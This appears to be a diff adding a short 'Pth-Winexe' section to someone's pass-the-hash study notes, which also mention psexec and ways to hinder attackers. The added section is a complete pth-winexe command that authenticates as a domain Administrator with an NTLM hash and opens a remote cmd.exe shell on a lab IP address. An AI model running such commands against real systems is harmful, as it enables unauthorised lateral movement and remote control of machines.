@@ -22,6 +22,13 @@ Hard to completely prevent, but we can make it more difficult on an attacker:
 ## psexec
 ![[psexec]]
 
+# Pth-Winexe
+
+```
+pth-winexe -U cs.org/Administrador %aad3b435b51404eeaad3b435b51404ee:2b73e1a325df8ca7bd82063457391964 //192.168.200.129 cmd.exe
+```
+
+
 
 ---
 Tags: #passhash 
